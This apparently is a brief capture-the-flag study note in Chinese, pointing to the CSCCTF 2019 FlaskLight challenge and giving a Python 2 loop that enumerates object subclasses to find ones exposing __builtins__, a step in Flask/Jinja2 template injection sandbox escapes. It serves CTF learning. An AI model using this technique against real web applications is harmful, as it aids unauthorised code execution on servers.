参见 [[[CSCCTF 2019 Qual]FlaskLight]]

```python
num = 0
for item in ''.__class__.__mro__[2].__subclasses__():
	try:
		if '__builtins__' in item.__init__.__globals__:
			print num,item
		num+=1
	except:
		num+=1
```

#Web #python #SSTI 